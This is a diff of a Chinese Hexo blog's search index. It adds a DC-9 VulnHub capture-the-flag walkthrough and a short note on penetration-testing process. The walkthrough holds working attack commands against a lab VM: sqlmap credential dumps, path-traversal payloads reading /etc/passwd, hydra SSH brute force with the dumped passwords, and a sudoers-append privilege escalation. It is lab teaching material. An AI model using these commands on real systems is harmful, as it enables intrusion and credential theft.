@@ -1,9 +1,224 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>使用Hexo搭建个人博客</title>
+    <url>/2024/03/30/My-Blog/</url>
+    <content><![CDATA[<hr>
+<h1 id="第一篇博客"><a href="#第一篇博客" class="headerlink" title="第一篇博客"></a>第一篇博客</h1><p>今日不同往时，生死看淡，不服就干，奥里给！！！！！！</p>
+<div class="tag-plugin image"><div class="image-bg"><img src="https://s.xaox.cc/xaoxuu/posts/202401131914137.jpg-hd" alt="图片由 xaoxuu 拍摄于一个普通的阳光明媚的下午"/><a class="image-download blur" style="opacity:0" target="_blank" download="图片由 xaoxuu 拍摄于一个普通的阳光明媚的下午" href="https://s.xaox.cc/xaoxuu/posts/202401131914137.jpg-hd"><svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="3734"><path d="M561.00682908 685.55838913a111.03077546 111.03077546 0 0 1-106.8895062 0L256.23182837 487.72885783a55.96309219 55.96309219 0 0 1 79.13181253-79.18777574L450.70357448 523.88101491V181.55477937a55.96309219 55.96309219 0 0 1 111.92618438 0v344.06109173l117.07478902-117.07478901a55.96309219 55.96309219 0 0 1 79.13181252 79.18777574zM282.81429711 797.1487951h447.70473912a55.96309219 55.96309219 0 0 1 0 111.92618438H282.81429711a55.96309219 55.96309219 0 0 1 0-111.92618438z" p-id="3735"></path></svg></a></div><div class="image-meta"><span class="image-caption center">图片由 xaoxuu 拍摄于一个普通的阳光明媚的下午</span></div></div>
+
+
+]]></content>
+      <categories>
+        <category>Blog</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2024/03/30/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>好杂</title>
+    <url>/2024/03/31/ni-hao/</url>
+    <content><![CDATA[<h1 id="很杂"><a href="#很杂" class="headerlink" title="很杂"></a>很杂</h1><p>很杂</p>
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY5YzU0ODVkZmQyMWQ1OTllZDU4YzUzODQ3Y2I0ZjJfN1RENVNyZkdQNTBNOHpyak9YR0Y2aDUxeWdxNnZ5NU5fVG9rZW46UFl3QWJmU1B5b1lYbFZ4VnV1cmNTWUxqblFmXzE3MTE4Njk5ODQ6MTcxMTg3MzU4NF9WNA" alt="img"></p>
+<h1 id="渗漏测试流程"><a href="#渗漏测试流程" class="headerlink" title="渗漏测试流程"></a>渗漏测试流程</h1><ol>
+<li>明确目标</li>
+<li>信息收集</li>
+</ol>
+<p> 域名，子域名，端口，网络架构，网站目录结构。。。。。。。</p>
+<ol>
+<li>漏洞分析&#x2F;漏洞扫描&#x2F;寻找漏洞</li>
+<li>漏洞利用</li>
+</ol>
+<p>Http  80 </p>
+<p>Https  443 </p>
+<hr>
+<p><img src="C:\Users\vpro\AppData\Roaming\Typora\typora-user-images\image-20240331152749707.png" alt="image-20240331152749707"></p>
+<hr>
+<p>域名</p>
+<p>IP</p>
+<p>端口</p>
+<p>cms指纹</p>
+<p>网络空间测绘</p>
+<p>目录扫描</p>
+<hr>
+<p>网络空间测绘：</p>
+<p>钟馗之眼&#x2F;<a href="https://www.zoomeye.hk/">首页 - ZoomEye 真地图，网络空间地图的全球领导者</a></p>
+<p>fofa&#x2F;<a href="https://fofa.info/">网络空间测绘，网络空间安全搜索引擎，网络空间搜索引擎，安全态势感知 - FOFA网络空间测绘系统</a></p>
+<p>quake.360.cn&#x2F;<a href="https://www.zoomeye.hk/">首页 - ZoomEye 真地图，网络空间地图的全球领导者</a></p>
+<p>鹰图&#x2F;<a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p>
+<p><img src="https://img2020.cnblogs.com/blog/1950264/202007/1950264-20200731170503369-279339554.jpg" alt="Snipaste_2020-07-31_15-42-19"></p>
+]]></content>
+      <categories>
+        <category>Blog</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-9</title>
+    <url>/2024/04/01/DC-9/</url>
+    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YWRhZmQ2NTIwMTEyMzlmMTk5NGNmNjAzNDJkMmExZDJfOGs5UDEwTUFnbmdITlVNamc3dkRHeWVjRDF3aXpDNHhfVG9rZW46VVJNM2I4WVF1b0pHVzZ4c1NFSmMxVE45bjFlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.217.129/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjgxNzc2ZDY4NGRkYjcwZjk3MTcwYjc3YTQ5ZjFjZjRfZDI2YmZJSklxV1M5dURvVE12SEtzQjVJZXdUN2hHSHRfVG9rZW46V3hwMmJQdkpFb0FZZWZ4cVRzQ2M3WkIwbmxoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.217.137</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NmJjODRiYTUzZDViNjI2YzA0YjQ4NjA4YmM3OTRiMzZfWHpHcERWcW1ZRWdLUkgwZGxaMlZ3cTNUYXdFdHpJWDZfVG9rZW46QU1vWmJFek1zb0s2aGF4eW1nSWNCZVV5bkRoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>注意到ssh服务端口是filtered的，可能是什么原因给关掉了</p>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u 192.168.217.137 -e * -x 403 --random-agent</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NDY2NGViMGQxYTBiZDRjZGZlM2Q3MDlkZDZmMmIyMjVfMU56Vms5R3NmNUZIdFE4N29Ua1NxbUNXSVFSQ2k2OGZfVG9rZW46SDhvR2I5Sm1yb0xRTTR4SURORmNLMU9CbnJnXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<h2 id="页面探测"><a href="#页面探测" class="headerlink" title="页面探测"></a>页面探测</h2><p>暂时无图</p>
+<p>探测结果：</p>
+<p>发现Search页面搜索存在<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>（原因：在上传之后网址无任何变动，判断是post请求）</p>
+<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="SQ注入"><a href="#SQ注入" class="headerlink" title="SQ注入"></a>SQ注入</h2><p>知道注入点，接下来上sqlmap跑，POST传参search，爆库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; --current-db</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA0ZGEyMjgzZDM2MGRhZThjNDQ4YzY4MjU1MTAwMGFfeFMwUmQ1M0VYMFpZbWswNXdoQUMxWjA0VEQyWWVmdXBfVG9rZW46WTRUNWJjUGt5b3p2R2t4Vzd6dmNTQ0N1bjdjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>得到数据库后进行爆表&#x2F;数据库：Staff</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmZlNWE3Mzc4NDJhYTlkNzkwZTUxZWRkZGI2YjQwMmJfYlRETGVaTHFLYWlDdTdGa1lLcG5tdlhjcjZ3TDhDaTJfVG9rZW46RWk3Y2JaY2Vpb2xkTHV4SFJQMmM0bWxMbnBiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -T &#x27;Users&#x27; -columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ODFjZDAwNDUwODc3ZGM0ZTFjNWNkZmYxYzY1OTAzZmFfT2lBb0FhVmtwRktUYklPMWZYMjlxSlVjUFVPcWdib1BfVG9rZW46T204SmJ6OGJvb1JmQWx4dlFiU2N5WWNxbnhjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>爆值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;Staff&#x27; -T &#x27;Users&#x27; -C &#x27;Username,Password,UserID&#x27; -dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MDMwNDA1Yzc5MTRjMzA3NTk3NDBiNzRiNGQyZjY3NWJfYmU4NkVXWFJWYk9aQVNyMDIwSExpSWE2N09sdzBna3ZfVG9rZW46TlVlMGJZRkhnb0JhcEh4a2g0RWNiWDJxbmdkXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>只有一位用户，还有密码，这密码一看就是md5，接下来找个在线网站解密<a href="https://www.somd5.com/">https://www.somd5.com/</a></p>
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjg2NjAyMGVjNzBiY2Q5NjVlODM1NDUwNDMzNjgyODBfZFVqQlBuTzFIdEo2amRvWXRjVmVZTGRZcllnMUZLanNfVG9rZW46TXg0V2JXWFdRb3dBN054OVVxTmNBd1ZKbk5mXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>密码：transorbital1</p>
+<h2 id="登入后台"><a href="#登入后台" class="headerlink" title="登入后台"></a>登入后台</h2><p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDkyMTcxZWUyZTFkMjU2OGIzMDk4MmYxZTcxYjY3MDFfSW00cDBjVnNMaGZMb1N2Tnp4WjdhWGhYZFA4SVNEdWpfVG9rZW46SXc0aGJLaFNxb1RYREN4SnBsWmNEMUZEbnhmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>就多了个Add Record界面，注意到下面有File does not exist，想到是程序引用或读取了一个不存在的文件才会回显这个，接着用参数fuzz测试一下</p>
+<p>burpsuite抓包，构建payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?§§=../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Njk3MmVlMzI4ZTdiNjI4NDJjYzRjNGIwNjViYjk3OGJfblVqNkFmUHJXVFVmcjJJdVJsa2FsT0R0VXA3UXhzSHZfVG9rZW46V1V2N2JuN1VDb1F1V2N4S3lYN2NGTEVibjdiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>然后再把我们的参数字典加载进来</p>
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjE3ODVhMzNmZjgzYjVkMzZmZjI5MWEyNTJjYjY5MzdfcUcxdlpKUEFoQlA4ZUxncFRLV3JIMHdqR0RseDEwSGZfVG9rZW46VTluTGJsVk5Cb1kwZ3Z4MTAwNWM5MjJVbkNkXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MjU4NTM3MTE0MTE3NDY3ZDg3YTUzMGE0M2QwYTg4ZjhfazZkQUxkNkhlM1JwUVJvS1doMHg2ZTJzZ1VkUlRoOFRfVG9rZW46TTkzMmJaSjJKb3JJZU54U3hJdGNZa2ZFbnpjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>参数名是file，存在任意文件读取漏洞</p>
+<h2 id="端口敲门服务"><a href="#端口敲门服务" class="headerlink" title="端口敲门服务"></a>端口敲门服务</h2><p>考虑到ssh端口是关闭的，可能是开启了knock服务（参考<a href="https://www.cnblogs.com/xiaoxiaoleo/p/8523322.html">端口敲门服务</a>），利用文件包含确认一下，一般开启了knock服务就会存在&#x2F;etc&#x2F;knockd.conf文件</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/addrecord.php?file=../../../../../etc/knockd.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWQ4NjUwNzg2OTdhZTEwNWVlMDY5NDhhNWNhYmUxOGFfTGhEZ0ZSZWQwZ3c4SHhqckJGb2xIYkhHYkU3ZHl0S1hfVG9rZW46Sk50VGJueWtEb0Z0R1Z4QmV4NWNzRzJJbnNmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>果然有，开启ssh服务得依次敲击7469,8475,9842端口，利用netcat进行敲击</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -z 192.168.217.137 7469 8475 9842</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YTQ3NjkzMGY0NzM4MGE4YWY1NDZmZjFiYWEzZGQzYTFfUWtmYkJvQW56ZTYxNlMxdVk1QXFSeUhUZGtmOGhpZGZfVG9rZW46WktlWmJJSWI3bzhQQ1N4TW5IdmNmSFdSbnVRXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>敲击完后发现端口打开了</p>
+<h2 id="shh爆破"><a href="#shh爆破" class="headerlink" title="shh爆破"></a>shh爆破</h2><p>无奈测试了一下admin登不上去，想起之前SQLmap跑出过一个users的数据库</p>
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzM5MTNmOTY0ZWRiMGNkYTYyMWEzODI1MzAzYjJlMzZfdEpHTTl1NDJnSHg2N2pOa2FHa2s5STlNdHFYZDFQcjdfVG9rZW46VGlmcmJ1emszbzM2R0x4YzZXOWNpdmFPbkVoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>存放网站用户信息的，我们去瞧一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.217.137/results.php&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; -D &#x27;users&#x27; -dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Mjg5N2ZmNTAwZjYxYTJkOGQ4MTNlMjI3MjAzOTE0YTNfSG5jTGxuaWhubGV2N2V5S3BnUWFWb3JQSUY1b0xwS0VfVG9rZW46QzY0b2JyaURxb3FMTGl4bkRKdGN4amdqbkxmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>用这些账号密码组成字典，爆破ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi username.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi password.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3kfs86sfd</span><br><span class="line">468sfdfsd2</span><br><span class="line">4sfd87sfd1</span><br><span class="line">RocksOff</span><br><span class="line">TC&amp;TheBoyz</span><br><span class="line">B8m#48sd</span><br><span class="line">Pebbles</span><br><span class="line">BamBam01</span><br><span class="line">UrAG0D!</span><br><span class="line">Passw0rd</span><br><span class="line">yN72#dsd</span><br><span class="line">ILoveRachel</span><br><span class="line">3248dsds7s</span><br><span class="line">smellycats</span><br><span class="line">YR3BVxxxw87</span><br><span class="line">Ilovepeepee</span><br><span class="line">Hawaii-Five-0</span><br></pre></td></tr></table></figure>
+
+<p>接下来用九头蛇进行爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.217.137</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Zjk0NTBmZGExY2E4MGFjZGIwZjdiOTMyMjZmYjVmNDNfb2k5WXltRFlKUFBXSFM3T1YyV1I4ZHpTNGZOVUxWY2tfVG9rZW46UWo0N2JRa1Yxb2JUQXZ4anRBYWN0b2RNbjdmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>爆破出了三个用户</p>
+<p>chandlerb:UrAG0D!</p>
+<p>joeyt:Passw0rd</p>
+<p>janitor:Ilovepeepee</p>
+<p>尝试登入发现janitor用户有东西</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls -la</span><br><span class="line">cd .s*</span><br><span class="line">cat *</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MmExOGQxNTM5MGU3ODNiZjVkN2NmNWI3MDE0OGY4YWNfazRlSk5Od2kzOUVCS2w1ZjJDZmdYM1VNOGdrdW9PeUtfVG9rZW46TjR3VWJLN0Jpb1hXbG94ZlNUZWNzaEFSbmJWXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>有几个密码，复制到刚才的password文件继续爆破ssh</p>
+<p>vi password.txt</p>
+<p>BamBam01</p>
+<p>Passw0rd</p>
+<p>smellycats</p>
+<p>P0Lic#10-4</p>
+<p>B4-Tru3-001</p>
+<p>4uGU5T-NiGHts</p>
+<p>继续爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.217.137</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjJmMjMxYTQ2M2U0ZTM4MjNmMTFmNTg5MzY3N2FjNjlfcUF1akZyaEc3bEJGVlg0TThMQzRad3Jtem82UmJjM2JfVG9rZW46V1l0VGJLRHh3b3BxUll4YmhsUmNiWW9NbnNlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>爆破出了一个新用户</p>
+<p>fredf     B4-Tru3-001</p>
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjJlYzY5MWVlZDdkMGZkZmZhZTk5YjY2MTNhNjE1ZGFfVUZybjhkMkpPNkNEMTAzb1A4V0V4YkV0QXpBcXBvMHpfVG9rZW46TUJQTGJrZzI5b2hGREV4Vlkwd2NCSTN4bm1nXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjU3NTVlYjhhMTE2Y2E5ODQxNTFhMDFkYTUzNWZmODZfTEh4YVhoR0d4eTM5R3lvODNQbTlkcU9TNjlEbHljSVJfVG9rZW46RkpwbWJ0VjdRb2M5SFJ4cmk5YmNra3VsbnlmXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>发现有个root权限文件</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /opt/devstuff/dist/test/test</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NjE0NWQ1NzU2MDNjYjAzMTlmODIwMjExMjc1MDc1OGZfcXhnMnN4clQxOG56aFBrMGFqUHpFUmlXRld0ckJMMjBfVG9rZW46SUNYVWJFMDZ1b3hlUFZ4WlBCMGNSREo3bk1nXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>打开test文件发现是一堆乱码，应该是一个程序</p>
+<p>type name 可以查看文件类型，看是否是二进制还是文本文件</p>
+<p>结果：啥也没看出来</p>
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjY3Y2FkZjM5ZDEzNWU3ZDc3MmQ1N2U0ZTFjYWYwMDlfVk1mZXNLSWtGZ0t3M1JiWlF0V3JlWHQ3RlNMRHNpUTlfVG9rZW46VlN1QmJaN3FMb3VuTE14VXg5MWNBUnFtblZjXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>在上两级目录发现test.py文件还有test.spec文件，所以后面目录下的test程序应该就是根据test.py文件写的，打开文件看一下test程序是干嘛的</p>
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NzY3NmY0YzMxNDMzYmMyMzM0MzcwMTI2ODJjODJhZjBfMnlQaTY4S010VmlKSUhmamdCSXNhQ2FPcVZhM1h0UGlfVG9rZW46S1hHU2I4VXFlb1Bza3l4V09HRmNGbmcwblA4XzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>该脚本的意思是打开用户输入的第二个文件，将第二个文件的内容追加保存到第三个文件里面，也就是说如果有命令是test.py a.txt b.txt，就会将a.txt的文件内容保存到b.txt里面</p>
+<p>利用&#x2F;etc&#x2F;sudoers     <a href="https://blog.csdn.net/Field_Yang/article/details/51547804">sudo配置文件&#x2F;etc&#x2F;sudoers详解及实战用法-CSDN博客</a></p>
+<p>将fredf  ALL&#x3D;(ALL:ALL) ALL写成一个文件a.ttx   将这个文件追加到&#x2F;etc&#x2F;sudoers</p>
+<p>先将目录切换到有权限的&#x2F;home&#x2F;fredf</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/fredf</span><br></pre></td></tr></table></figure>
+
+<p>然后进行文件的创建的编辑</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi a.ttx`    有人说在这里vi是个微型的，简单来说有坑，所以也可以用`nano a.ttx</span><br></pre></td></tr></table></figure>
+
+<p>写完就可进行&#x2F;home&#x2F;fredf的写入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /opt/devstuff/dist/test/test a.ttx /etc/sudoers</span><br></pre></td></tr></table></figure>
+
+<p>不显示就说明成功了</p>
+<p>之后进行用户切换</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su - </span><br></pre></td></tr></table></figure>
+
+<p>sudo 就是尝试实行root权限  su就是提权  - 切换到环境变量里</p>
+<p>然后输入用户fredf的密码就可以了     密码：B4-Tru3-001</p>
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=M2NiOTg5OGY4MGQxZmRiNzQ2NjFmOGYyYWE4NDY0MmNfVjExVnd3REkzNjRMS0RhYU41RXdTRzBXM0l5cG5sOWdfVG9rZW46Vk53ZWJzVDhkbzh5OTR4WHN6emNRV001bjZlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+<p>之后就是寻找flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">cat theflag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTA3YTlhZjdiZmYwOTBmNzg5MTUzMjhlZTg2YzNiYWZfdENoZGVkcVMydWs2OVZjQTVXZ2o0S2trT2hwNWxKQjBfVG9rZW46SEF3VWJCREgyb0hCUTJ4bEp2bWNsVElLbmxiXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
+]]></content>
+      <categories>
+        <category>靶场，DC系列</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网络安全题库</title>
     <url>/2024/04/02/%E9%9D%A2%E8%AF%95%E9%A2%98%E5%BA%93/</url>
-    <content><![CDATA[<h1 id="网络安全题库"><a href="#网络安全题库" class="headerlink" title="网络安全题库"></a>网络安全题库</h1><h2 id="1-php爆绝对路径的方法？"><a href="#1-php爆绝对路径的方法？" class="headerlink" title="1.php爆绝对路径的方法？"></a>1.php爆绝对路径的方法？</h2><h3 id="1-1单引号引起数据库报错"><a href="#1-1单引号引起数据库报错" class="headerlink" title="1.1单引号引起数据库报错"></a>1.1单引号引起数据库报错</h3><ul>
+    <content><![CDATA[<h2 id="1-php爆绝对路径的方法？"><a href="#1-php爆绝对路径的方法？" class="headerlink" title="1.php爆绝对路径的方法？"></a>1.php爆绝对路径的方法？</h2><h3 id="1-1单引号引起数据库报错"><a href="#1-1单引号引起数据库报错" class="headerlink" title="1.1单引号引起数据库报错"></a>1.1单引号引起数据库报错</h3><ul>
 <li>说明：直接在URL后面加单引号，要求单引号没有被过滤(gpc&#x3D;off)且服务器默认返回错误信息。</li>
 <li>举例：<a href="https://www.xxx.com/news.php?id=149">https://www.xxx.com/news.php?id=149</a>‘</li>
 </ul>
@@ -937,424 +1152,5 @@
         <tag>网络安全，护网</tag>
         <tag>面试</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>DC-1</title>
-    <url>/2024/04/01/la/</url>
-    <content><![CDATA[<ol>
-<li><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1></li>
-<li><h2 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h2></li>
-<li><p>Kali</p>
-</li>
-<li><p>DC-1靶场机安装</p>
-</li>
-</ol>
-<p>安装链接：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p>
-<ol>
-<li><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2></li>
-</ol>
-<p>下载文件进行解压</p>
